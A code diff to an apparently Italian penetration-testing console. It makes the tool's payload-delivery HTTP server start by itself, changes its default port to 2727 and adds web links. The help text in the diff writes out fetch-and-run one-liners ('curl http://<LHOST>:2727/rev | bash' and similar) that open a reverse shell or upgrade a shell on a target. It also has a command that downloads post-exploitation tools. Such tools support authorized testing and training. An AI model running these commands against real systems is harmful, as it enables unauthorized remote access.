@@ -15,7 +15,7 @@ from dataclasses import dataclass, field
 from pathlib import Path
 from shutil import get_terminal_size, which
 
-from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static, discover_interfaces as _serve_discover_interfaces
+from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static, discover_interfaces as _serve_discover_interfaces, get_web_url as _serve_get_url
 
 try:
     import readline  # type: ignore
@@ -273,6 +273,7 @@ def cmd_sealsay(args: argparse.Namespace, state: ConsoleState | None = None) -> 
 
 def print_tool_help(tool: ToolEntry) -> None:
     text = tool.help_file.read_text(encoding="utf-8", errors="replace").rstrip()
+    _print_web_link("tools", tool.name)
     render_markdown(text)
 
 
@@ -294,6 +295,7 @@ def print_help_text() -> None:
     print("  vuln <protocollo>  Mostra cheatsheet  (vuln list per elenco)")
     print("  notes <argomento>  Mostra una guida    (notes list per elenco)")
     print("  serve <azione>     Server HTTP di delivery (serve help per dettagli)")
+    print("  serve list         Elenca i file in static/")
     print("  sealsay [testo]    Stampa un messaggio in stile cowsay")
     print("  back               Torna alla console principale")
     print("  help               Mostra questo aiuto")
@@ -424,7 +426,7 @@ def build_parser() -> argparse.ArgumentParser:
     serve_p = subparsers.add_parser("serve", add_help=False)
     serve_p.add_argument("action", nargs="?", default="status")
     serve_p.add_argument("subtopic", nargs="?", default=None)
-    serve_p.add_argument("--port", type=int, default=8000)
+    serve_p.add_argument("--port", type=int, default=2727)
     serve_p.add_argument("--lhost", default=None)
     serve_p.add_argument("--lport", type=int, default=4444)
     serve_p.add_argument("--force", action="store_true", default=False)
@@ -672,9 +674,46 @@ def run_command(argv: list[str], state: ConsoleState | None = None) -> int:
     return handler(args, state)
 
 
+def _autostart_server() -> None:
+    """Ask for network interface and start the HTTP server automatically."""
+    ifaces = _serve_discover_interfaces()
+    if not ifaces:
+        print("\033[93m[!]\033[0m Nessuna interfaccia di rete trovata, server non avviato.")
+        return
+
+    if len(ifaces) == 1:
+        lhost = ifaces[0][1]
+    else:
+        print("\n  Interfacce disponibili:\n")
+        for i, (name, addr) in enumerate(ifaces, 1):
+            print(f"    [{i}] {name:<12s}  {addr}")
+        print()
+        while True:
+            try:
+                choice = input("  Scegli interfaccia per il server [1]: ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                return
+            if not choice:
+                choice = "1"
+            if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
+                lhost = ifaces[int(choice) - 1][1]
+                break
+            print(f"  Inserisci un numero da 1 a {len(ifaces)}.")
+
+    result = _serve_start(lhost=lhost)
+    for line in result.splitlines():
+        print(f"  {line}")
+    print()
+
+
 def run_console() -> int:
     state = ConsoleState()
+    _autostart_server()
     print_banner()
+    url = _serve_get_url()
+    if url:
+        print(f"  \033[96mWeb:\033[0m {url}")
     print("Digita 'help' per i comandi, \033[1mESC\033[0m per uscire.")
     while True:
         prompt = f"\033[94mConsole({state.current_tool.name})> \033[0m" if state.current_tool else f"\033[94mslconsole({state.current_vuln})> \033[0m" if state.current_vuln else "\033[94mslconsole> \033[0m"
@@ -727,6 +766,8 @@ def run_console() -> int:
             idx = int(argv[1]) - 1
             if 0 <= idx < len(state._find_results):
                 src, label, file_path, _ = state._find_results[idx]
+                section_map = {"vuln": "vuln", "tool": "tools", "notes": "notes"}
+                _print_web_link(section_map.get(src, src), file_path.stem if src != "tool" else label)
                 text = file_path.read_text(encoding="utf-8", errors="replace")
                 _render_highlighted(text, state._find_query)
                 if src == "tool":
@@ -1013,6 +1054,7 @@ def cmd_vuln(args: argparse.Namespace, state: ConsoleState | None = None) -> int
         return 1
 
     md_text = vuln_file.read_text(encoding="utf-8", errors="replace")
+    _print_web_link("vuln", key)
     render_markdown(md_text)
 
     if state is not None:
@@ -1064,6 +1106,7 @@ def cmd_notes(args: argparse.Namespace, state: ConsoleState | None = None) -> in
         return 1
 
     md_text = note_file.read_text(encoding="utf-8", errors="replace")
+    _print_web_link("notes", key)
     render_markdown(md_text)
     return 0
 
@@ -1126,6 +1169,12 @@ def _render_highlighted(text: str, query: str) -> None:
     _paged_print(output)
 
 
+def _print_web_link(section: str, key: str) -> None:
+    url = _serve_get_url()
+    if url:
+        print(f"\n  \033[96mWeb:\033[0m {url}/{section}/{key}\n")
+
+
 def _serve_help_main() -> None:
     render_markdown(r"""# Quick-Delivery Server
 
@@ -1136,7 +1185,7 @@ Serve payload dinamici e file statici via `curl` dal target.
 
 | Comando | Descrizione |
 |---------|-------------|
-| `serve on [--port N] [--lhost IP] [--lport N]` | Avvia (default: porta 8000, IP auto) |
+| `serve on [--port N] [--lhost IP] [--lport N]` | Avvia (default: porta 2727, IP auto) |
 | `serve off` | Arresta |
 | `serve status` | Mostra stato corrente |
 | `serve fetch [--force]` | Scarica i tool di post-exploitation in `static/` |
@@ -1161,7 +1210,7 @@ Trasforma una shell instabile (es. netcat `/bin/sh`) in una TTY interattiva.
 ## Uso
 
 ```bash
-curl http://<LHOST>:8000/upgrade | bash
+curl http://<LHOST>:2727/upgrade | bash
 ```
 
 ## Prerequisito
@@ -1192,7 +1241,7 @@ One-liner bash per ottenere una reverse shell.
 ## Uso
 
 ```bash
-curl http://<LHOST>:8000/rev | bash
+curl http://<LHOST>:2727/rev | bash
 ```
 
 ## Prerequisito
@@ -1222,7 +1271,7 @@ Utile quando bash non supporta `/dev/tcp` (es. Debian/Ubuntu con `dash`).
 ## Uso
 
 ```bash
-curl http://<LHOST>:8000/sh | bash
+curl http://<LHOST>:2727/sh | bash
 ```
 
 ## Prerequisito
@@ -1244,7 +1293,7 @@ def _serve_help_static() -> None:
         port = _server.server_address[1]
         base = f"http://{_lhost}:{port}"
     else:
-        base = "http://<LHOST>:8000"
+        base = "http://<LHOST>:2727"
 
     lines = ["# static/ — File Statici\n"]
     lines.append("Cartella che il server serve come download diretto.")
@@ -1296,7 +1345,7 @@ def cmd_serve(args: argparse.Namespace, state: ConsoleState | None = None) -> in
             _serve_help_main()
         return 0
     if action in {"on", "start"}:
-        port = getattr(args, "port", 8000)
+        port = getattr(args, "port", 2727)
         lhost = getattr(args, "lhost", None)
         lport = getattr(args, "lport", 4444)
 
